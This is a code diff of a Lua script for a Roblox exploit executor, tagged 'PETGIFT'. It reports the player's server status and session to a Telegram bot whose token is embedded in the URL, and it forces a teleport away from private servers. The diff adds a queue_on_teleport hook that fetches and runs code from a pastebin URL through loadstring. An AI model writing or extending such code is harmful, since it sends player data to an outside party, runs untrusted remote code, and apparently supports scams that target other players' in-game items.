@@ -2,12 +2,11 @@ warn("[PETGIFT] Script started with Telegram logging")
 
 local DEBUG_TAG = "[PETGIFT]"
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
-local PLACE_ID = 126884695634066 -- Same place ID
+local PLACE_ID = 126884695634066
 
 -- Telegram configuration
 local TELEGRAM_URL = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage"
@@ -49,17 +48,21 @@ local function sendTelegramLog(reason)
 	pcall(function() requestFunc(payload) end)
 end
 
--- Queue this script to run after teleport
-if syn then
-	syn.queue_on_teleport(script.Source)
+-- Queue this script to run again after teleport
+if syn and syn.queue_on_teleport then
+	syn.queue_on_teleport(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_SCRIPT"))() -- Replace with your actual raw script
+	end)
 elseif queue_on_teleport then
-	queue_on_teleport(script.Source)
+	queue_on_teleport(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_SCRIPT"))()
+	end)
 end
 
 -- Send JobId immediately on script start
 sendTelegramLog(Players.PrivateServerId and "Started in private server" or "Started in public server")
 
--- Only hop if in a private server
+-- Hop only if in private server
 if Players.PrivateServerId then
 	debugPrint("Private server detected. Hopping...")
 	TeleportService:Teleport(PLACE_ID, LocalPlayer)
